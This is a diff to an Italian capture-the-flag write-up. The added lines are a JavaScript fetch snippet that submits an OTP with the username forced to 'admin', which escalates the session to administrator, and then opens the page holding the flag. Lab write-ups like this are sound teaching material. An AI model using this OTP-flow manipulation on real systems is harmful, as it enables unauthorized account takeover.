@@ -38,6 +38,22 @@ Iniezione e Privilege Escalation: È stata inviata una richiesta POST al server 
 
 È stato inserito l' otpcode generato precedentemente.
 
+
+// Creiamo i dati della richiesta forzando 'admin' come username
+let params = new URLSearchParams();
+params.append('username', 'admin');
+params.append('otpcode', '123456'); // <--- METTI IL CODICE QUI
+
+fetch('/otp.php', {
+    method: 'POST',
+    body: params,
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+}).then(() => {
+    // Dopo aver inviato l'OTP di admin, navighiamo alla pagina della flag
+    window.location.href = "/?page=stash";
+});
+
+
 Al successo della verifica, il server ha aggiornato la variabile di sessione $_SESSION["username"] impostandola su admin, garantendo l'accesso completo.
 
 Recupero della Flag: Navigando sulla risorsa ?page=stash con la sessione di amministratore attiva, la flag è stata visualizzata correttamente.
